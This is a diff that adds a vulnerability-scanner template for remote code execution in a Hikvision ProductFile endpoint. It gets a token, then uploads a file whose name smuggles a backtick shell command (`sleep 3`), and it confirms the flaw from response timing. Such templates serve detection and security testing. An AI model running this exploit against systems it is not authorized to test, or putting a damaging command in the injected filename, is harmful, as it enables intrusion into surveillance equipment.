@@ -1,0 +1,60 @@
+id: hikvision-productfile-rce
+info:
+  name: Hikvision ProductFile Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Exploitation of Hikvision ProductFile endpoint leading to remote code execution.
+
+variables:
+  boundary: "---------------------------142851345723692939351758052805"
+
+flow: http(1) && http(2)
+
+http:
+  - id: get-token
+    method: GET
+    path:
+      - "{{BaseURL}}/iac/iasService/v1/register"
+    extractors:
+      - type: regex
+        name: token
+        regex:
+          - "Token:\\s*(\\w[\\w=]*)"
+        part: header
+        internal: true
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Token:"
+
+  - id: trigger-rce
+    method: POST
+    path:
+      - "{{BaseURL}}/svm/api/v1/productFile?type=product&ip=127.0.0.1&agentNo=1"
+    headers:
+      Token: "{{token}}"
+      Content-Type: "multipart/form-data;boundary={{boundary}}"
+    body: |
+      {{boundary}}
+      Content-Disposition: form-data; name="file"; filename="123`sleep 3`.zip"
+      Content-Type: application/zip
+      
+      123
+      {{boundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"code\":\"0\""
+          - "msg"
+          - "data"
+      - type: dsl
+        dsl:
+          - "duration >= 6 && duration <= 7"
